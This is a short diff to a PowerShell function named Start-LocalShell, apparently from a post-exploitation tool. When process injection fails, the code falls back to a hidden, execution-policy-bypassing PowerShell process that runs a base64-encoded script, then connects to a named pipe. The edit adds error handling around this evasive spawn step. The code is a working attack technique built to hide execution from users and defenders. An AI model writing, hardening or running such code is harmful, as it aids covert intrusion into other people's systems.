@@ -2528,8 +2528,10 @@ function Start-LocalShell {
             } catch {}
             if (-not $_injOk) {
                 Write-Host " [!] Injection failed (no SeDebugPrivilege?) — spawning hidden PS process instead." -ForegroundColor Yellow
-                $b64enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($built.RawScript))
-                Start-Process powershell.exe -ArgumentList "-ep bypass -nop -w hidden -enc $b64enc" -WindowStyle Hidden
+                try {
+                    $b64enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($built.RawScript))
+                    Start-Process powershell.exe -ArgumentList @('-ep','bypass','-nop','-w','hidden','-enc',$b64enc) -WindowStyle Hidden
+                } catch { Write-Host " [!] Spawn failed: $($_.Exception.Message)" -ForegroundColor Red }
             }
             Write-Host " [+] Connecting to pipe $PN (15s timeout)..." -ForegroundColor Green
             Start-Sleep -Seconds 2
